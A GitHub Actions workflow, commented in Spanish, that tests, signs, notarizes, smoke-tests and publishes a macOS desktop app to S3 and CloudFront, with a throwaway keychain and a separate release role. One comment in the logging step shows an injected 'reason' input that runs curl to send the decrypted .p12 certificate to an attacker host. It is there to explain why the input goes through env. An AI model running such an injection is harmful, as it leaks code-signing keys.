# La cadena que empaqueta, firma, notariza y publica la app de escritorio.
#
# **Esto abre una superficie de confianza** (spec 008): lo que se publique aquí
# reemplaza el binario que ejecuta comandos en la máquina del partner. De ahí
# tres cosas que no son estilo:
#
#   * Se verifica ANTES de construir. Firmar una aplicación cuyas pruebas nadie
#     corre es firmar a ciegas.
#   * Se ABRE el .app firmado antes de publicar. `hardenedRuntime` sin los
#     permisos correctos **no falla al construir: falla al abrir**, así que un
#     build en verde no prueba nada.
#   * Se publica con un rol propio, distinto del de despliegue. Un rol que puede
#     poner binarios en máquinas de clientes no puede tocar ECS, y al revés.
#
# **Es el primer trabajo del repositorio en macOS** — todo lo demás corre en
# ubuntu-latest y éste cuesta bastante más por minuto. Por eso se dispara sólo
# al publicar (una marca `v*`) o a mano, nunca en cada push.

name: release-desktop

on:
  push:
    tags: ["v*"]
  # El disparo manual existe para que nadie tenga la tentación de firmar en su
  # portátil y subir el binario a mano durante un incidente. Sigue firmando y
  # notarizando aquí, y sigue dejando rastro de quién lo lanzó.
  workflow_dispatch:
    inputs:
      reason:
        description: "Por qué se publica a mano (queda en el registro)"
        required: true

concurrency:
  # Dos publicaciones a la vez dejarían el índice apuntando a un paquete que
  # todavía no está entero. Se hace cola, y no se cancela la que va a medias.
  group: release-desktop
  cancel-in-progress: false

env:
  NODE_VERSION: "22"
  PNPM_VERSION: "10.15.0"

jobs:
  release:
    name: build · sign · notarize · publish
    runs-on: macos-latest
    permissions:
      contents: read
      id-token: write   # OIDC. No hay claves de AWS en este repositorio.

    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4

      - uses: pnpm/action-setup@b906affcce14559ad1aafd4ab0e942779e9f58b1 # v4
        with:
          version: ${{ env.PNPM_VERSION }}

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: pnpm

      - name: Instalar dependencias
        run: pnpm install --frozen-lockfile

      # Las pruebas del cliente, antes de firmar nada (R6.2).
      #
      # ``--filter`` desde la RAÍZ, nunca ``working-directory``: apps/desktop
      # tiene su propio pnpm-workspace.yaml anidado que no lista
      # packages/companion-ui, y cualquier pnpm ejecutado DENTRO de esa carpeta
      # muere con ERR_PNPM_WORKSPACE_PKG_NOT_FOUND antes de llegar a vitest. Es
      # el mismo aviso que ci.yml lleva escrito, y sigue siendo fácil de pisar.
      - name: Pruebas del escritorio
        run: |
          pnpm --filter @nexus/desktop typecheck
          pnpm --filter @nexus/desktop test

      - name: Construir
        run: pnpm --filter @nexus/desktop build

      # ── firma ───────────────────────────────────────────────────────────
      #
      # Llavero temporal, creado para esta ejecución y destruido al terminar
      # pase lo que pase (R5.1, R5.2). Es lo que hace que «no depende del
      # llavero de nadie» y «no queda accesible después» sean la misma cosa.
      - name: Preparar el llavero de firma
        env:
          CERT_P12_BASE64: ${{ secrets.APPLE_CERT_P12_BASE64 }}
          CERT_PASSWORD: ${{ secrets.APPLE_CERT_PASSWORD }}
        run: |
          set -euo pipefail
          KEYCHAIN="$RUNNER_TEMP/signing.keychain-db"
          KEYCHAIN_PASSWORD="$(openssl rand -base64 32)"
          echo "KEYCHAIN=$KEYCHAIN" >> "$GITHUB_ENV"

          security create-keychain -p "$KEYCHAIN_PASSWORD" "$KEYCHAIN"
          security set-keychain-settings -lut 3600 "$KEYCHAIN"
          security unlock-keychain -p "$KEYCHAIN_PASSWORD" "$KEYCHAIN"

          printf '%s' "$CERT_P12_BASE64" | base64 --decode > "$RUNNER_TEMP/cert.p12"
          security import "$RUNNER_TEMP/cert.p12" -k "$KEYCHAIN" \
            -P "$CERT_PASSWORD" -T /usr/bin/codesign -T /usr/bin/security
          rm -f "$RUNNER_TEMP/cert.p12"

          # Sin esto, codesign abre un diálogo — y en un runner sin pantalla eso
          # es un trabajo colgado hasta el timeout, no un error legible.
          security set-key-partition-list -S apple-tool:,apple: \
            -s -k "$KEYCHAIN_PASSWORD" "$KEYCHAIN" > /dev/null
          security list-keychains -d user -s "$KEYCHAIN" login.keychain-db

          # Que la identidad esté de verdad ahí, antes de construir diez minutos
          # para descubrir que no.
          security find-identity -v -p codesigning "$KEYCHAIN" | grep "Developer ID Application"

      - name: Empaquetar, firmar y notarizar
        env:
          CSC_KEYCHAIN: ${{ env.KEYCHAIN }}
          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
          APPLE_API_KEY_ID: ${{ secrets.APPLE_API_KEY_ID }}
          APPLE_API_ISSUER: ${{ secrets.APPLE_API_ISSUER_ID }}
          # Por `env:` como los otros cinco. Interpolado en el cuerpo del script
          # acababa dentro del fichero que el runner escribe en disco, fuera del
          # enmascarado que GitHub aplica a la salida.
          APPLE_API_KEY_P8_BASE64: ${{ secrets.APPLE_API_KEY_P8_BASE64 }}
        run: |
          set -euo pipefail
          mkdir -p "$RUNNER_TEMP/private_keys"
          printf '%s' "$APPLE_API_KEY_P8_BASE64" | base64 --decode \
            > "$RUNNER_TEMP/private_keys/AuthKey_${APPLE_API_KEY_ID}.p8"
          export APPLE_API_KEY="$RUNNER_TEMP/private_keys/AuthKey_${APPLE_API_KEY_ID}.p8"

          pnpm --filter @nexus/desktop dist
          rm -rf "$RUNNER_TEMP/private_keys"

      # ── la prueba de humo, que es la que de verdad importa ──────────────
      - name: Verificar firma, notarización y sello
        run: |
          set -euo pipefail
          APP="$(find apps/desktop/dist -maxdepth 2 -name '*.app' -print -quit)"
          test -n "$APP" || { echo "no se construyó ningún .app"; exit 1; }

          codesign --verify --deep --strict --verbose=2 "$APP"
          codesign -dvvv "$APP" 2>&1 | grep -q 'flags=.*runtime' \
            || { echo "el .app NO lleva hardened runtime"; exit 1; }
          spctl --assess --type execute --verbose "$APP"

          for pkg in apps/desktop/dist/*.dmg apps/desktop/dist/*.zip; do
            [ -e "$pkg" ] || continue
            xcrun stapler validate "$pkg"
          done

      # Construir en verde no prueba que abra. Esto sí.
      - name: Abrir el .app firmado
        run: |
          set -euo pipefail
          APP="$(find apps/desktop/dist -maxdepth 2 -name '*.app' -print -quit)"
          open -g "$APP"
          sleep 20
          pgrep -f "$(basename "$APP" .app)" > /dev/null \
            || { echo "el .app firmado NO arranca: hardened runtime sin los permisos correctos"; exit 1; }
          pkill -f "$(basename "$APP" .app)" || true

      # ── publicar ────────────────────────────────────────────────────────
      - name: Credenciales de AWS
        uses: aws-actions/configure-aws-credentials@61815dcd50bd041e203e49132bacad1fd04d2708 # v5
        with:
          role-to-assume: ${{ secrets.AWS_RELEASE_ROLE_ARN }}
          aws-region: eu-south-2

      - name: Publicar en el canal
        env:
          BUCKET: ${{ vars.DESKTOP_RELEASES_BUCKET }}
          DISTRIBUTION: ${{ vars.DESKTOP_RELEASES_DISTRIBUTION }}
        run: |
          set -euo pipefail
          # Los paquetes PRIMERO y el índice DESPUÉS. Al revés dejaría el canal
          # anunciando durante unos segundos una versión cuyo binario no está —
          # y el actualizador que la pidiera se llevaría un 404.
          #
          # Nada se borra: publicar es añadir. La versión anterior sigue siendo
          # la única marcha atrás que existe cuando el puente es saliente.
          for f in apps/desktop/dist/*.dmg apps/desktop/dist/*.zip apps/desktop/dist/*.blockmap; do
            [ -e "$f" ] || continue
            aws s3 cp "$f" "s3://$BUCKET/desktop/$(basename "$f")"
          done
          for f in apps/desktop/dist/latest-mac.yml; do
            [ -e "$f" ] || continue
            aws s3 cp "$f" "s3://$BUCKET/desktop/$(basename "$f")"
          done

          aws cloudfront create-invalidation \
            --distribution-id "$DISTRIBUTION" \
            --paths "/desktop/latest-mac.yml"

      - name: Dejar constancia de lo publicado
        env:
          # **El motivo va por `env:` y NO interpolado en el script.** Es texto
          # libre que escribe una persona, y `${{ }}` dentro de un `run:` lo
          # pega en el cuerpo del shell antes de ejecutarlo: un motivo como
          # `"; curl -d @$RUNNER_TEMP/cert.p12 https://evil/ #` se ejecutaría en
          # el mismo runner donde el .p12 acaba de descifrarse. Por `env:` llega
          # como valor y no como código.
          RELEASE_REASON: ${{ github.event.inputs.reason }}
        run: |
          {
            echo "### Publicado"
            echo ""
            echo "- versión: \`$(node -p "require('./apps/desktop/package.json').version")\`"
            echo "- desde: \`${{ github.sha }}\` (\`${{ github.ref }}\`)"
            echo "- lo disparó: \`${{ github.actor }}\` vía \`${{ github.event_name }}\`"
            if [ -n "$RELEASE_REASON" ]; then
              echo "- motivo declarado: $RELEASE_REASON"
            fi
          } >> "$GITHUB_STEP_SUMMARY"

      # `if: always()` no es una precaución: es el requisito. Un llavero que
      # sobrevive a un fallo a mitad es la identidad de firma esperando en el
      # disco de un runner compartido.
      - name: Destruir el llavero
        if: always()
        run: |
          security delete-keychain "$KEYCHAIN" 2>/dev/null || true
          rm -rf "$RUNNER_TEMP/private_keys" "$RUNNER_TEMP/cert.p12" 2>/dev/null || true
